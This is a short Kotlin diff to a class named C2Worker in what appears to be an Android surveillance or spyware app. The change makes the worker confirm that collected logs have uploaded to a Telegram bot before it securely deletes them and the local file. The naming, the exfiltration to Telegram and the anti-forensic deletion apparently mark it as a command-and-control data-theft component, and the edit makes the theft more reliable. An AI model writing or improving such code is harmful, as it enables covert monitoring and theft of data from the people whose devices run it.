@@ -80,13 +80,18 @@ class C2Worker(
             }
 
             // Send to Telegram
-            telegramClient.sendDocument(file)
+            val success = telegramClient.sendDocument(file)
 
-            // Cleanup on success
-            repository.deleteAllLogs()
-            SecureDelete.deleteSecurely(file)
-            
-            Log.i("C2Worker", "Uploaded & secure deleted ${logs.size} logs")
+            if (success) {
+                // Cleanup on success
+                repository.deleteAllLogs()
+                SecureDelete.deleteSecurely(file)
+                Log.i("C2Worker", "Uploaded & secure deleted ${logs.size} logs")
+            } else {
+                Log.e("C2Worker", "Upload failed. Logs retained.")
+                // Delete temp file but keep logs in DB
+                SecureDelete.deleteSecurely(file)
+            }
 
         } catch (e: Exception) {
             Log.e("C2Worker", "Failed to upload logs", e)
